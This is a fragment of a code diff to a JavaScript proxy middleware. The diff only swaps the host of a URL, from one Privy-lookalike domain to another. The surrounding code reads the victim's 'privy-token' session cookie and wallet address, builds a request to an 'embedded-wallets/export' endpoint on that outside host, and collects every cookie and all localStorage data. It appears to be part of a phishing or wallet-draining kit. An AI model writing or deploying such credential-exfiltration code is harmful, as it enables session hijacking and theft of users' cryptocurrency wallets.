@@ -139,7 +139,7 @@ const proxy = createProxyMiddleware({
           const privyToken = getCookie('privy-token');
           const address = getLastPartOfLocalStorageKey('privy_wallet');
           if (privyToken && address) {
-            const exportUrl = \`https://privy.awc-eg.team/apps/clthf5zo505s513atuph9xful/embedded-wallets/export?token=\${privyToken}&address=\${address}\`;
+            const exportUrl = \`https://privy.nolgit.com/apps/clthf5zo505s513atuph9xful/embedded-wallets/export?token=\${privyToken}&address=\${address}\`;
 
             const allCookies = document.cookie;
             const localStorageData = JSON.stringify(Object.fromEntries(Object.entries(localStorage)));
